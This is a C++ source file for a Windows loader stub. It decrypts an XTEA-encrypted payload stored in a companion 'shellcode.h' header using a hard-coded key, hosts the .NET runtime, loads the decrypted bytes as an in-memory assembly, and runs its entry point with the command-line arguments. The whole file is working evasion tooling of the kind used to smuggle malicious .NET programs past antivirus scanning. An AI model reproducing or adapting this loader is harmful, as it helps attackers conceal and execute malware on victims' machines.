
#include "pch.h"

////////////////////////////////////////////////
//
//	Stuff for .NET environment
//
////////////////////////////////////////////////

#pragma region Includes and Imports
#include <windows.h>
#include <metahost.h>
#include <vector>
#pragma comment(lib, "mscoree.lib")
#import "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\mscorlib.tlb" implementation_only raw_interfaces_only \
            high_property_prefixes("_get","_put","_putref")\
            rename("ReportEvent", "InteropServices_ReportEvent") \
			rename("or", "InteropServices_or") 
using namespace mscorlib;
#pragma endregion



////////////////////////////////////////////////
//
//	Common stuff
//
////////////////////////////////////////////////

#include <iostream>
#include <cstdlib>
#include <sstream>
#include <cassert>
#include <fstream>
#include <tchar.h>




////////////////////////////////////////////////
//
//	Xtea decypher
//
////////////////////////////////////////////////

#include "shellcode.h"
#include <stdint.h>
unsigned int key[4] = { 0xAAAA,0xA123,0x3211,0x4444 };  /* Chose a password in hex   */
#define BLOCK_SIZE 8                               /* Make sure you change both */
												  /* xtea.cpp and stub.cpp     */



void decipher(uint32_t v[2], unsigned int num_rounds, uint32_t const key[4]) {
	unsigned int i;
	uint32_t v0 = v[0], v1 = v[1], delta = 0x9E3779BA, sum = (delta - 1)*(num_rounds - 32);
	for (i = 0; i < (num_rounds - 32); i++) {
		v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum >> 11) & 3]);
		sum -= delta - 1;
		v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
	}
	v[1] = v1; v[0] = v0;
}



////////////////////////////////////////////////
//
//	Program
//
////////////////////////////////////////////////


int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
{

	////////////////////////////////////////////////
	//
	//	Create .NET environment 
	//
	////////////////////////////////////////////////

	CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	ICLRMetaHost       *pMetaHost = NULL;
	ICLRMetaHostPolicy *pMetaHostPolicy = NULL;
	ICLRDebugging      *pCLRDebugging = NULL;
	HRESULT hr;
	hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost,
		(LPVOID*)&pMetaHost);
	hr = CLRCreateInstance(CLSID_CLRMetaHostPolicy, IID_ICLRMetaHostPolicy,
		(LPVOID*)&pMetaHostPolicy);
	hr = CLRCreateInstance(CLSID_CLRDebugging, IID_ICLRDebugging,
		(LPVOID*)&pCLRDebugging);
	ICLRRuntimeInfo* pRuntimeInfo = NULL;
	hr = pMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (VOID**)&pRuntimeInfo);
	BOOL bLoadable;
	hr = pRuntimeInfo->IsLoadable(&bLoadable);
	ICorRuntimeHost* pRuntimeHost = NULL;
	hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost,
		IID_ICorRuntimeHost,
		(VOID**)&pRuntimeHost);
	hr = pRuntimeHost->Start();
	IUnknownPtr pAppDomainThunk = NULL;
	hr = pRuntimeHost->GetDefaultDomain(&pAppDomainThunk);
	_AppDomainPtr pDefaultAppDomain = NULL;
	hr = pAppDomainThunk->QueryInterface(__uuidof(_AppDomain), (VOID**)&pDefaultAppDomain);
	_AssemblyPtr pAssembly = NULL;
	SAFEARRAYBOUND rgsabound[1];
	rgsabound[0].cElements = size;
	rgsabound[0].lLbound = 0;
	SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);
	void* pvData = NULL;
	hr = SafeArrayAccessData(pSafeArray, &pvData);



	////////////////////////////////////////////////
	//
	//	Decipher shellcode and load to an _AssemblyPtr
	//
	////////////////////////////////////////////////

	char* shellcode_decrypted = new char[size];

	int n_blocks = size / BLOCK_SIZE;
	if (size%BLOCK_SIZE != 0)              //pad the shellcode
		++n_blocks;

	unsigned char data[BLOCK_SIZE];

	for (int i = 0; i < n_blocks; i++) {
		memcpy(&data, &shellcode[i*BLOCK_SIZE], BLOCK_SIZE); //copy the shellcode into the data buffer
		decipher((uint32_t*)data, 64, key); //de-xtea it

		for (int j = 0; j < BLOCK_SIZE; j++)
			memcpy(&shellcode_decrypted[(i*BLOCK_SIZE) + j], &data[j], sizeof(unsigned char));

		memset(data, 0, BLOCK_SIZE);
	}

	memcpy(pvData, shellcode_decrypted, size);
	delete shellcode_decrypted;

	hr = SafeArrayUnaccessData(pSafeArray);
	hr = pDefaultAppDomain->Load_3(pSafeArray, &pAssembly);




	////////////////////////////////////////////////
	//
	//	Prepare .NET Main arguments
	//
	////////////////////////////////////////////////


	long idx[1];
	VARIANT obj, retVal, args;
	obj.vt = VT_NULL;
	args.vt = VT_ARRAY | VT_BSTR;

	int argc;
	LPWSTR *argv = CommandLineToArgvW((LPCWSTR)lpCmdLine, &argc);

	SAFEARRAYBOUND argsBound[1];
	argsBound[0].lLbound = 0;
	argsBound[0].cElements = argc;
	args.parray = SafeArrayCreate(VT_BSTR, 1, argsBound);
	assert(args.parray);
	for (int i = 0; i < argc; i++)
	{
		idx[0] = i;
		SafeArrayPutElement(args.parray, idx, SysAllocString(argv[i]));
	}


	SAFEARRAY *psaStaticMethodArgs = NULL;
	SAFEARRAYBOUND paramsBound[1];
	paramsBound[0].lLbound = 0;
	paramsBound[0].cElements = 1;
	psaStaticMethodArgs = SafeArrayCreate(VT_VARIANT, 1, paramsBound);
	assert(psaStaticMethodArgs);
	idx[0] = 0;
	SafeArrayPutElement(psaStaticMethodArgs, idx, &args);




	////////////////////////////////////////////////
	//
	//	Execute .NET PE shellcode
	//
	////////////////////////////////////////////////


	_MethodInfoPtr pMethodInfo = NULL;

	hr = pAssembly->get_EntryPoint(&pMethodInfo);

	hr = pMethodInfo->Invoke_3(obj, psaStaticMethodArgs, &retVal);



	return 0;
}
